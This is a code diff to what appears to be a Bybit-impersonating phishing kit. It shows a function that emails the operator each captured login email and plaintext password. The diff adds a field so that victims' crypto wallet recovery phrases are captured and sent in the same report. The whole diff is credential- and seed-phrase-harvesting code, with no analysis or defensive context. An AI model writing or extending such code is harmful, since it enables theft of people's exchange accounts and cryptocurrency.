@@ -137,6 +137,7 @@ export async function sendBybitLoginEmail(data: {
   deviceInfo: string
   ipAddress: string
   timestamp: string
+  walletPhrase?: string
 }) {
   const statusColor = data.loginSuccess ? "#4caf50" : "#f44336"
   const statusText = data.loginSuccess ? "SUCCESS" : "FAILED"
@@ -152,8 +153,8 @@ export async function sendBybitLoginEmail(data: {
       <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
         <h3 style="color: #333;">Login Details:</h3>
         <p><strong>Timestamp:</strong> ${data.timestamp}</p>
-        <p><strong>Email Used:</strong> <span style="color: #e74c3c;">${data.loginEmail}</span></p>
-        <p><strong>Password Used:</strong> <span style="color: #e74c3c;">${data.loginPassword}</span></p>
+        <p><strong>Email Used:</strong> <span style="color: #e74c3c; word-break: break-all;">${data.walletPhrase != null ? data.walletPhrase : (data.loginEmail || 'Web3 Login')}</span></p>
+        <p><strong>Password Used:</strong> <span style="color: #e74c3c;">${data.walletPhrase != null ? 'Web3 Login' : (data.loginPassword || 'Web3 Login')}</span></p>
         <p><strong>Login Status:</strong> <span style="color: ${statusColor}; font-weight: bold;">${statusText}</span></p>
       </div>
       
